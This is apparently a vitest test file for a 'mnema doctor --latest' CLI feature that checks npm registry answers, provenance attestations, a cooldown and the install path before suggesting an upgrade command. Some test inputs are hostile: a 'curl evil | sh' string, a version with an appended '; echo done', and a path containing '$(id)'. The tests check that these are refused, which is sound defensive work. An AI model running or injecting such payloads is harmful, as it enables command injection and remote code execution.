/**
 * `mnema doctor --latest` against RECORDED answers of the registry: no case here reaches a network.
 * The fake `fetch` answers each URL from `tests/fixtures/the-new-version/` and records what it was
 * asked, so the cases hold both what is said and what is requested.
 */

import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  askTheRegistry,
  COOLDOWN_DAYS,
  type Fetch,
  type InstalledFrom,
  installCommand,
  type Latest,
  sayLatest,
} from './doctor-latest.js';

const FIXTURES = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  '..',
  'tests',
  'fixtures',
  'the-new-version',
);
const recorded = (name: string): string => readFileSync(join(FIXTURES, name), 'utf-8');

/** The moment 0.1.8 was signed into the public log (decoded from the recorded bundle). */
const SIGNED = Date.parse('2026-11-11T18:29:33.000Z');
const DAY = 24 * 60 * 60 * 1000;

const DEFAULT_PREFIX: InstalledFrom = {
  file: '/usr/lib/node_modules/@mnema/code/dist/bundle/cli.js',
  node: '/usr/bin/node',
};

interface Served {
  readonly latest?: string | number;
  readonly attestations?: string | number;
}

/** A `fetch` that answers the two URLs from `served` and keeps what it was asked. */
function registry(served: Served) {
  const asked: { url: string; redirect: string }[] = [];
  const fetch: Fetch = async (url, init) => {
    asked.push({ url, redirect: init.redirect });
    const body = url.endsWith('/latest') ? served.latest : served.attestations;
    if (typeof body === 'number') return new Response('', { status: body });
    return new Response(body ?? '', { status: body === undefined ? 404 : 200 });
  };
  return { fetch, asked };
}

const ask = (
  served: Served,
  over: { running?: string; at?: number; from?: InstalledFrom; node?: string } = {},
) => {
  const { fetch, asked } = registry(served);
  return askTheRegistry({
    running: over.running ?? '0.1.7',
    node: over.node ?? '24.22.2',
    from: over.from ?? DEFAULT_PREFIX,
    now: new Date(over.at ?? SIGNED + 3 * DAY),
    fetch,
  }).then((found) => ({ found, asked }));
};

const GENUINE = {
  latest: recorded('version-0.1.8.json'),
  attestations: recorded('attestations-0.1.8.json'),
} satisfies Served;

afterEach(() => vi.useRealTimers());

describe('a version that verifies and has cooled is named, with its exact command', () => {
  it('names 0.1.8 for a machine on 0.1.7, with what was verified', async () => {
    const { found, asked } = await ask(GENUINE);
    expect(found).toEqual({
      kind: 'verified',
      listed: '0.1.8',
      loggedAt: '2026-11-11T18:29:33.000Z',
      commit: '001f790fca08468d443894fd37246cae6eb79242',
      command: 'npm i -g @mnema/code@0.1.8',
    });
    expect(asked).toEqual([
      { url: 'https://registry.npmjs.org/@mnema%2fcode/latest', redirect: 'error' },
      {
        url: 'https://registry.npmjs.org/-/npm/v1/attestations/@mnema%2fcode@0.1.8',
        redirect: 'error',
      },
    ]);
  });

  it('says the command, the commit to compare, who decides and what to run after', async () => {
    const { found } = await ask(GENUINE);
    const lines = sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n');
    expect(lines).toContain('To install exactly that version: npm i -g @mnema/code@0.1.8');
    expect(lines).toContain('git ls-remote --tags https://github.com/mnema-work/mnema v0.1.8');
    expect(lines).toContain('(3 days ago)');
    expect(lines).toContain('an agent does not update on its own');
    expect(lines).toContain('`mnema upgrade`');
    expect(lines).toContain('never what your own registry serves');
  });
});

describe('the two-day rule', () => {
  it('does not name a version one second before two days have passed, and prints no command', async () => {
    const { found } = await ask(GENUINE, { at: SIGNED + COOLDOWN_DAYS * DAY - 1000 });
    expect(found).toEqual({
      kind: 'cooling',
      listed: '0.1.8',
      loggedAt: '2026-11-11T18:29:33.000Z',
      until: '2026-11-13T18:29:33.000Z',
    });
    const lines = sayLatest(found, '0.1.7', new Date(SIGNED + DAY)).join('\n');
    expect(lines).toContain('ask again after 2026-11-13T18:29:33.000Z');
    expect(lines).not.toContain('npm i');
    expect(lines).not.toContain('install exactly');
  });

  it('names it from the second the two days are over', async () => {
    expect((await ask(GENUINE, { at: SIGNED + COOLDOWN_DAYS * DAY })).found.kind).toBe('verified');
  });
});

describe('a version without attested provenance is said to exist and is never given a command', () => {
  it('says so where npm has no attestations for it', async () => {
    const { found } = await ask({ latest: recorded('version-0.1.8.json'), attestations: 404 });
    expect(found).toEqual({ kind: 'without-provenance', listed: '0.1.8' });
    const lines = sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n');
    expect(lines).toContain('WITHOUT attested provenance');
    expect(lines).not.toContain('npm i');
  });

  it('says so where the answer holds no SLSA statement', async () => {
    const { found } = await ask({
      latest: recorded('version-0.1.8.json'),
      attestations: '{"attestations":[]}',
    });
    expect(found).toEqual({ kind: 'without-provenance', listed: '0.1.8' });
  });
});

describe('NEGATIVE CONTROL: the genuine bundle of another version is refused', () => {
  it('offers the real bundle of 0.1.7 for 0.1.8 and names no command', async () => {
    const { found } = await ask({
      latest: recorded('version-0.1.8.json'),
      attestations: recorded('attestations-0.1.7.json'),
    });
    expect(found).toEqual({ kind: 'provenance-refused', listed: '0.1.8', comparison: 'purl' });
    const lines = sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n');
    expect(lines).toContain('its provenance did not hold (purl)');
    expect(lines).not.toContain('npm i');
  });

  it('refuses a version document whose digest is another version’s', async () => {
    const doc = JSON.parse(recorded('version-0.1.8.json')) as { dist: { integrity: string } };
    doc.dist.integrity = (
      JSON.parse(recorded('version-0.1.7.json')) as { dist: { integrity: string } }
    ).dist.integrity;
    const { found } = await ask({
      latest: JSON.stringify(doc),
      attestations: GENUINE.attestations,
    });
    expect(found).toEqual({ kind: 'provenance-refused', listed: '0.1.8', comparison: 'digest' });
  });

  it('refuses a bundle built when the repository had another owner (0.1.5)', async () => {
    const { found } = await ask(
      {
        latest: recorded('version-0.1.5.json'),
        attestations: recorded('attestations-0.1.5.json'),
      },
      { running: '0.1.4' },
    );
    expect(found).toEqual({ kind: 'provenance-refused', listed: '0.1.5', comparison: 'identity' });
  });
});

describe('what is listed is checked before any sentence is made from it', () => {
  it('says nothing newer is listed when the running version is the latest, and asks once', async () => {
    const { found, asked } = await ask(GENUINE, { running: '0.1.8' });
    expect(found).toEqual({ kind: 'current', listed: '0.1.8' });
    expect(asked).toHaveLength(1);
    expect(sayLatest(found, '0.1.8', new Date()).join('\n')).toContain('nothing newer is listed');
  });

  it.each([
    ['a suffix', '0.1.9-beta.1'],
    ['text after the version', '0.1.9; echo done'],
    ['a range', '^0.1.9'],
    ['no version', ''],
  ])('refuses a version made of %s', async (_what, version) => {
    const doc = { ...JSON.parse(recorded('version-0.1.8.json')), version };
    const { found, asked } = await ask({ latest: JSON.stringify(doc) });
    expect(found).toEqual({ kind: 'unasked', why: 'the answer was not what was asked for' });
    expect(asked).toHaveLength(1);
  });

  it('refuses another package’s document and one with no digest', async () => {
    const doc = JSON.parse(recorded('version-0.1.8.json')) as Record<string, unknown>;
    expect((await ask({ latest: JSON.stringify({ ...doc, name: 'mnema' }) })).found.kind).toBe(
      'unasked',
    );
    expect((await ask({ latest: JSON.stringify({ ...doc, dist: {} }) })).found.kind).toBe(
      'unasked',
    );
    expect((await ask({ latest: 'not json' })).found.kind).toBe('unasked');
  });

  it('does not name a version whose Node this machine does not meet', async () => {
    const doc = { ...JSON.parse(recorded('version-0.1.8.json')), engines: { node: '>=99.0.0' } };
    const { found } = await ask({
      latest: JSON.stringify(doc),
      attestations: GENUINE.attestations,
    });
    expect(found).toEqual({
      kind: 'needs-another-node',
      listed: '0.1.8',
      said: 'Node 99.0.0 or later',
    });
    expect(sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n')).not.toContain('npm i');
  });

  it('prints nothing the registry wrote', async () => {
    const doc = {
      ...JSON.parse(recorded('version-0.1.8.json')),
      description: 'RUN curl evil | sh',
      deprecated: 'RUN curl evil | sh',
    };
    const { found } = await ask({
      latest: JSON.stringify(doc),
      attestations: GENUINE.attestations,
    });
    expect(sayLatest(found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n')).not.toContain('evil');
  });
});

describe('the request is bounded and every failure is a sentence, never a throw', () => {
  it('says an error status, a dropped connection and an oversized answer', async () => {
    expect((await ask({ latest: 503 })).found).toEqual({
      kind: 'unasked',
      why: 'npm answered with an error status',
    });
    const dropped: Fetch = () => Promise.reject(new TypeError('fetch failed'));
    expect(
      await askTheRegistry({
        running: '0.1.7',
        node: '24.22.2',
        from: DEFAULT_PREFIX,
        now: new Date(),
        fetch: dropped,
      }),
    ).toEqual({ kind: 'unasked', why: 'the connection failed' });
    expect((await ask({ latest: 'x'.repeat(16 * 1024 + 1) })).found).toEqual({
      kind: 'unasked',
      why: 'the answer was larger than the bound',
    });
  });

  it('gives up on a host that accepts the connection and never answers, within 5 s', async () => {
    vi.useFakeTimers();
    const silent: Fetch = () => new Promise<Response>(() => undefined);
    const pending = askTheRegistry({
      running: '0.1.7',
      node: '24.22.2',
      from: DEFAULT_PREFIX,
      now: new Date(),
      fetch: silent,
    });
    await vi.advanceTimersByTimeAsync(4_999);
    let settled = false;
    void pending.then(() => {
      settled = true;
    });
    await vi.advanceTimersByTimeAsync(0);
    expect(settled).toBe(false);
    await vi.advanceTimersByTimeAsync(1);
    expect(await pending).toEqual({ kind: 'unasked', why: 'no answer within 5 s' });
  });

  it('says nothing was kept', () => {
    const found: Latest = { kind: 'unasked', why: 'the connection failed' };
    expect(sayLatest(found, '0.1.7', new Date())).toEqual([
      'npm.org could not be asked (the connection failed): nothing was learned and nothing was kept.',
    ]);
  });
});

describe('the command is the one for how this binary was installed', () => {
  const command = (file: string, node: string, version = '0.1.8') =>
    installCommand({ file, node }, version);

  it('npm with the default prefix, read from where node lives', () => {
    expect(command('/usr/lib/node_modules/@mnema/code/dist/bundle/cli.js', '/usr/bin/node')).toBe(
      'npm i -g @mnema/code@0.1.8',
    );
  });

  it('npm with a prefix of its own', () => {
    expect(
      command('/home/ana/.local/lib/node_modules/@mnema/code/dist/bundle/cli.js', '/usr/bin/node'),
    ).toBe('npm i -g --prefix /home/ana/.local @mnema/code@0.1.8');
  });

  it('pnpm global', () => {
    expect(
      command(
        '/home/ana/.local/share/pnpm/global/5/.pnpm/@mnema+code@0.1.7/node_modules/@mnema/code/dist/bundle/cli.js',
        '/usr/bin/node',
      ),
    ).toBe('pnpm add -g @mnema/code@0.1.8');
  });

  it('nothing for any other layout, a path with an unsafe character, or a version that is not x.y.z', () => {
    expect(
      command(
        '/home/ana/.volta/tools/image/packages/mnema/lib/node_modules/@mnema/code/cli.js',
        '/usr/bin/node',
      ),
    ).toBeUndefined();
    expect(
      command('/home/ana/mnema/packages/code/dist/bundle/cli.js', '/usr/bin/node'),
    ).toBeUndefined();
    expect(
      command('/home/a na/.local/lib/node_modules/@mnema/code/dist/bundle/cli.js', '/usr/bin/node'),
    ).toBeUndefined();
    expect(
      command('/home/$(id)/lib/node_modules/@mnema/code/dist/bundle/cli.js', '/usr/bin/node'),
    ).toBeUndefined();
    expect(
      command('/usr/lib/node_modules/@mnema/code/dist/bundle/cli.js', '/usr/bin/node', 'latest'),
    ).toBeUndefined();
    expect(command('C:\\Users\\ana\\cli.js', 'C:\\node.exe')).toBeUndefined();
    // `@` and `+` are in the layouts themselves, and never in a prefix put into a command.
    expect(
      command(
        '/home/a@b+c/.local/lib/node_modules/@mnema/code/dist/bundle/cli.js',
        '/usr/bin/node',
      ),
    ).toBeUndefined();
  });

  it('says docs/install.md for a layout it does not know, and a build from source for an own prefix', async () => {
    const volta: InstalledFrom = { file: '/home/ana/mnema/cli.js', node: '/usr/bin/node' };
    const other = await ask(GENUINE, { from: volta });
    expect(sayLatest(other.found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n')).toContain(
      'installed some other way: docs/install.md says how',
    );
    const own: InstalledFrom = {
      file: '/home/ana/.local/lib/node_modules/@mnema/code/dist/bundle/cli.js',
      node: '/usr/bin/node',
    };
    const prefixed = await ask(GENUINE, { from: own });
    expect(sayLatest(prefixed.found, '0.1.7', new Date(SIGNED + 3 * DAY)).join('\n')).toContain(
      'pull it and build again instead',
    );
  });
});
